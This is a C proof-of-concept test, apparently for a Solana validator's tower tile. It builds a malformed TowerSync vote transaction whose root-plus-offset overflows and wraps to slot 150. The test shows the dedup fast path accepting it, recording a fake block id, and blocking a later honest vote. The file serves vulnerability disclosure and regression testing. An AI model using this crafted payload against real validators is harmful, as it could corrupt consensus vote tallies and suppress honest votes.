#define fd_eqvoc_query       mock_eqvoc_query_fn
#define QUERY_VOTE_ACCS      mock_query_vote_accs

#include "fd_tower_tile.c"

#include <stdlib.h>

ulong
mock_query_vote_accs( fd_tower_tile_t *            ctx FD_PARAM_UNUSED,
                      fd_replay_slot_completed_t * sc FD_PARAM_UNUSED,
                      fd_ghost_blk_t *             blk FD_PARAM_UNUSED,
                      int *                        found FD_PARAM_UNUSED,
                      ulong *                      bal FD_PARAM_UNUSED ) {
  return 0UL;
}

int
mock_eqvoc_query_fn( fd_eqvoc_t * eqvoc FD_PARAM_UNUSED,
                     ulong        slot  FD_PARAM_UNUSED ) {
  return 0;
}

int
main( int argc, char ** argv ) {
  fd_boot( &argc, &argv );

  fd_pubkey_t identity = { .ul = { 0x11UL } };
  fd_pubkey_t vote_acc = { .ul = { 0x22UL } };
  fd_hash_t fake_bank_hash = { .ul = { 0xAAUL } };
  fd_hash_t fake_block_id  = { .ul = { 0xBBUL } };

  ulong       page_sz   = fd_cstr_to_shmem_page_sz( "normal" );
  ulong       page_cnt  = 4096UL;
  ulong       numa_idx  = fd_shmem_numa_idx( 0 );
  fd_wksp_t * wksp     = fd_wksp_new_anonymous( page_sz, page_cnt, fd_shmem_cpu_idx( numa_idx ), "wksp", 0UL );
  FD_TEST( wksp );

  /* Minimal initialized tower context for the dedup fast path. */

  static fd_tower_tile_t ctx_mem[1];
  fd_tower_tile_t * ctx = ctx_mem;
  memset( ctx, 0, sizeof(*ctx) );

  void * ghost_mem         = fd_wksp_alloc_laddr( wksp, fd_ghost_align(),      fd_ghost_footprint( 2UL,   1UL ), 1UL );
  void * hfork_mem         = fd_wksp_alloc_laddr( wksp, fd_hfork_align(),      fd_hfork_footprint( 4UL,   1UL ), 1UL );
  void * votes_mem         = fd_wksp_alloc_laddr( wksp, fd_votes_align(),      fd_votes_footprint( 256UL, 1UL ), 1UL );
  void * tower_mem         = fd_wksp_alloc_laddr( wksp, fd_tower_align(),      fd_tower_footprint( 256UL, 1UL ), 1UL );
  void * scratch_tower_mem = fd_wksp_alloc_laddr( wksp, fd_tower_vote_align(), fd_tower_vote_footprint(),        1UL );
  void * publishes_mem     = fd_wksp_alloc_laddr( wksp, publishes_align(),     publishes_footprint( 4UL ),       1UL );

  FD_TEST( ghost_mem && hfork_mem && votes_mem && tower_mem && scratch_tower_mem && publishes_mem );

  ctx->ghost         = fd_ghost_join     ( fd_ghost_new     ( ghost_mem,         2UL,   1UL, 42UL ) );
  ctx->hfork         = fd_hfork_join     ( fd_hfork_new     ( hfork_mem,         4UL,   1UL, 42UL ) );
  ctx->votes         = fd_votes_join     ( fd_votes_new     ( votes_mem,         256UL, 1UL, 42UL ) );
  ctx->tower         = fd_tower_join     ( fd_tower_new     ( tower_mem,         256UL, 1UL, 42UL ) );
  ctx->scratch_tower = fd_tower_vote_join( fd_tower_vote_new( scratch_tower_mem ) );
  ctx->publishes     = publishes_join    ( publishes_new    ( publishes_mem,     4UL ) );

  FD_TEST( ctx->ghost && ctx->hfork && ctx->votes && ctx->tower && ctx->scratch_tower && ctx->publishes );

  ctx->tower->root        = 0UL;
  ctx->init               = 1;
  ctx->in_kind[0]         = IN_KIND_DEDUP;
  ctx->in[0].mcache_only  = 1;

  fd_hash_t root_block_id = { .ul = { 1UL } };
  fd_ghost_blk_t * root = fd_ghost_init( ctx->ghost, 0UL, &root_block_id );
  root->total_stake = 100UL;

  ulong stake[1] = { 1UL };
  fd_votes_publish( ctx->votes, 0UL );
  fd_votes_update_voters( ctx->votes, &vote_acc, stake, 1UL );
  fd_hfork_update_voters( ctx->hfork, &vote_acc, 1UL );
  fd_tower_stakes_insert( ctx->tower, 0UL, &vote_acc, stake[0], ULONG_MAX );

  /* root+offset overflows canonically, but wraps to slot 150 in ulong. */

  fd_compact_tower_sync_serde_t s[1] = {{
    .root                         = ULONG_MAX - 50UL,
    .lockouts_cnt                 = 1U,
    .lockouts[0].offset           = 201UL,
    .lockouts[0].confirmation_count = 1U,
    .hash                         = fake_bank_hash,
    .timestamp_option             = 0U,
    .block_id                     = fake_block_id
  }};

  uchar ix[ FD_TXN_MTU ];
  FD_STORE( uint, ix, FD_VOTE_IX_KIND_TOWER_SYNC );
  ulong body_sz = 0UL;
  FD_TEST( 0==fd_compact_tower_sync_ser( s, ix+sizeof(uint), sizeof(ix)-sizeof(uint), &body_sz ) );
  ulong ix_sz = sizeof(uint) + body_sz;

  /* This proves the same bytes would be rejected by vote-program/replay
     decoding.  The bug is that the fast path accepts them anyway. */

  fd_vote_instruction_t vote_ix[1];
  FD_TEST( NULL==fd_vote_instruction_deserialize( vote_ix, ix, ix_sz ) );
  FD_LOG_NOTICE(( "canonical vote decoder rejected overflowing TowerSync" ));

  /* Put the malformed instruction in a simple vote transaction. */

  static uchar const vote_program_id[ FD_TXN_ACCT_ADDR_SZ ] = {
    0x07U,0x61U,0x48U,0x1dU,0x35U,0x74U,0x74U,0xbbU,0x7cU,0x4dU,0x76U,0x24U,0xebU,0xd3U,0xbdU,0xb3U,
    0xd8U,0x35U,0x5eU,0x73U,0xd1U,0x10U,0x43U,0xfcU,0x0dU,0xa3U,0x53U,0x80U,0x00U,0x00U,0x00U,0x00U
  };

  uchar payload[ FD_TXN_MTU ];
  uchar * p = payload;

  *p++ = 1U;                         /* one signature */
  memset( p, 0, FD_TXN_SIGNATURE_SZ ); p += FD_TXN_SIGNATURE_SZ;

  *p++ = 1U;                         /* required signatures */
  *p++ = 0U;                         /* readonly signed accounts */
  *p++ = 1U;                         /* readonly unsigned accounts */

  *p++ = 3U;                         /* identity, vote account, vote program */
  memcpy( p, &identity, FD_TXN_ACCT_ADDR_SZ ); p += FD_TXN_ACCT_ADDR_SZ;
  memcpy( p, &vote_acc, FD_TXN_ACCT_ADDR_SZ ); p += FD_TXN_ACCT_ADDR_SZ;
  memcpy( p, vote_program_id, FD_TXN_ACCT_ADDR_SZ ); p += FD_TXN_ACCT_ADDR_SZ;

  memset( p, 0, FD_TXN_BLOCKHASH_SZ ); p += FD_TXN_BLOCKHASH_SZ;

  *p++ = 1U;                         /* one instruction */
  *p++ = 2U;                         /* program account index */
  *p++ = 2U;                         /* two instruction accounts */
  *p++ = 1U;                         /* vote account */
  *p++ = 0U;                         /* vote authority */

  FD_TEST( ix_sz<128UL );            /* compact-u16, one-byte form */
  *p++ = (uchar)ix_sz;
  memcpy( p, ix, ix_sz ); p += ix_sz;

  ulong payload_sz = (ulong)(p - payload);
  FD_TEST( payload_sz<=USHORT_MAX );

  /* Wrap it like a dedup_resolv fragment would. */

  static uchar frag_mem[ 4096 ] __attribute__((aligned(alignof(fd_txn_m_t))));
  fd_txn_m_t * txnm = (fd_txn_m_t *)frag_mem;
  memset( txnm, 0, sizeof(frag_mem) );
  txnm->payload_sz = (ushort)payload_sz;
  memcpy( fd_txn_m_payload( txnm ), payload, payload_sz );

  fd_txn_t * parsed = fd_txn_m_txn_t( txnm );
  ulong txn_t_sz = fd_txn_parse( fd_txn_m_payload( txnm ), txnm->payload_sz, parsed, NULL );
  FD_TEST( txn_t_sz && txn_t_sz<=USHORT_MAX );
  txnm->txn_t_sz = (ushort)txn_t_sz;

  ctx->in[0].mem = (fd_wksp_t *)frag_mem;

  /* Route through the tower tile entry callback. */

  FD_TEST( 0==returnable_frag( ctx, 0UL, 0UL, 0UL, 0UL, sizeof(frag_mem), 0UL, 0UL, 0UL, NULL ) );
  FD_LOG_NOTICE(( "dedup fast path accepted same malformed vote transaction" ));

  /* Vulnerable behavior: Tower accepted the malformed payload as a
     well-formed tower and counted it into votes/hfork state. */

  FD_TEST( ctx->metrics.txn_bad_deser==0UL );
  FD_TEST( ctx->metrics.txn_bad_tower==0UL );
  FD_TEST( ctx->metrics.votes_unknown_block_id==0UL );
  FD_TEST( ctx->metrics.votes_unknown_slot==1UL );

  fd_votes_blk_t * vblk = fd_votes_query( ctx->votes, 150UL, &fake_block_id );
  FD_TEST( vblk && vblk->stake==stake[0] );
  FD_LOG_NOTICE(( "ctx->votes counted stake=%lu for wrapped slot 150 and fake block_id", vblk->stake ));

  fd_hash_t real_block_id = { .ul = { 0xCCUL } };
  FD_TEST( FD_VOTES_ERR_ALREADY_VOTED==fd_votes_count_vote( ctx->votes, &vote_acc, 150UL, &real_block_id ) );
  FD_LOG_NOTICE(( "later honest vote for slot 150 is rejected as already voted" ));

  FD_TEST( FD_HFORK_ERR_ALREADY_VOTED==fd_hfork_count_vote( ctx->hfork, &vote_acc, &fake_block_id, &fake_bank_hash, 150UL, stake[0], root->total_stake ) );
  FD_LOG_NOTICE(( "ctx->hfork also recorded the fake block_id/bank_hash attestation" ));

  FD_LOG_NOTICE(( "pass" ));
  fd_wksp_delete_anonymous( wksp );
  fd_halt();
  return 0;
}
